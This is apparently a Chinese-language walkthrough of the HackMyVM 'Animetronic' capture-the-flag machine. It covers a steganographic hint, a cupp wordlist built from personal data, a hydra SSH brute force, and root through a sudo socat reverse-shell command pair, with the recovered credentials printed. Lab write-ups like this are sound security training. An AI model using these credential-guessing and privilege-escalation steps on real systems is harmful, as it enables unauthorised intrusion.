# Animetronic

2025.03.18 https://hackmyvm.eu/machines/machine.php?vm=Animetronic

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 扫描发现 http://192.168.5.40/staffpages/new_employees 是一张 jpeg 图片，exiftool 查看隐写 Comment 中显示 page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=

进行 base64 解码，并将内容反转得到: `message_for_michael` 提示访问这个页面 http://192.168.5.40/staffpages/message_for_michael :

```
Hi Michael

Sorry for this complicated way of sending messages between us.
This is because I assigned a powerful hacker to try to hack
our server.

By the way, try changing your password because it is easy
to discover, as it is a mixture of your personal information
contained in this file

personal_info.txt
```

访问这个文件 http://192.168.5.40/staffpages/personal_info.txt :

```
name: Michael

age: 27

birth date: 19/10/1996

number of children: 3 " Ahmed - Yasser - Adam "

Hobbies: swimming
```

说是 Michael 的密码是包含个人信息的混合，需要根据上面的信息组合生成密码。这里使用 cupp 根据上述个人信息生成字典，最后使用 hydra 爆破 michael 用户的密码：

```
[22][ssh] host: 192.168.5.40   login: michael   password: leahcim1996
```

在另外一个用户下，先拿到了 user flag:

```
michael@animetronic:/home/henry$ cat user.txt
0833990328464efff1de6cd93067cfb7
```

同时发现提示:

```
michael@animetronic:/home/henry$ cat Note.txt
if you need my account to do anything on the server,
you will find my password in file named

aGVucnlwYXNzd29yZC50eHQK
```

进行 base64 解码得到文件名 henrypassword.txt 进行查找：

```
michael@animetronic:/home/henry$ find / -type f -name 'henrypassword.txt' 2>/dev/null
/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt

IHateWilliam
```

切换到 henry 用户, sudo -l 显示 (root) NOPASSWD: /usr/bin/socat ，登陆 2 个 ssh 窗口，直接反弹 shell 到目标机器上:

```
socat file:`tty`,raw,echo=0 tcp-listen:8888

sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8888
```

拿到最终 root flag:

```
root@animetronic:/home/henry# id
uid=0(root) gid=0(root) groups=0(root)
root@animetronic:/home/henry# cd /root
root@animetronic:~# cat root.txt
153a1b940365f46ebed28d74f142530f280a2c0a
```
